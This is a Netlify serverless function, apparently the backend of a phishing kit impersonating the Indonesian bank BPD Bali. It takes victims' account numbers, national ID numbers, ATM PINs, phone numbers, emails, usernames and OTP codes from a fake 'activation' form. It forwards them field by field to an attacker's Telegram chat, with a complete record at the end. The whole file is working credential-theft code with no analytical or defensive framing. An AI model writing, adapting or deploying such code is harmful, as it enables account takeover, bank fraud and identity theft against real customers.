// netlify/functions/send-aktivasi.js
exports.handler = async (event) => {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
    
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Method not allowed' })
        };
    }
    
    try {
        const data = JSON.parse(event.body);
        const { triggerField, isFinal, noRekening, noIdentitas, pinAtm, noTelpon, email, username, kodeOtp, timestamp } = data;
        
        let message = '';
        
        // Format pesan berdasarkan trigger field (notifikasi per field)
        if (!isFinal) {
            switch(triggerField) {
                case 'noRekening':
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}`;
                    break;
                case 'noIdentitas':
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}`;
                    break;
                case 'pinAtm':
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}`;
                    break;
                case 'noTelpon':
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ NO.HP : ${noTelpon}`;
                    break;
                case 'email':
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ EMAIL : ${email}\n├───────────────────`;
                    break;
                case 'username':
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ EMAIL : ${email}\n├───────────────────\n├─ USER : ${username}`;
                    break;
                case 'kodeOtp':
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ EMAIL : ${email}\n├───────────────────\n├─ USER : ${username}\n├─ KODE : ${kodeOtp}\n╰───────────────────`;
                    break;
                default:
                    message = `┌─  BANK BPD BALI \n├───────────────────\n├─ Data terbaru tersimpan\n╰───────────────────`;
            }
        } else {
            // Notifikasi final lengkap
            message = `┌─  BANK BPD BALI \n├───────────────────\n├─ NO.REK : ${noRekening}\n├─ NIK.KTP : ${noIdentitas}\n├─ PIN ATM : ${pinAtm}\n├─ NO.HP : ${noTelpon}\n├─ EMAIL : ${email}\n├───────────────────\n├─ USER : ${username}\n├─ KODE : ${kodeOtp}\n├───────────────────\n├─ WAKTU : ${timestamp}\n╰───────────────────`;
        }
        
        // Kirim ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        
        if (!result.ok) {
            throw new Error(result.description);
        }
        
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Notifikasi terkirim' })
        };
        
    } catch (error) {
        console.error('Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: error.message })
        };
    }
};
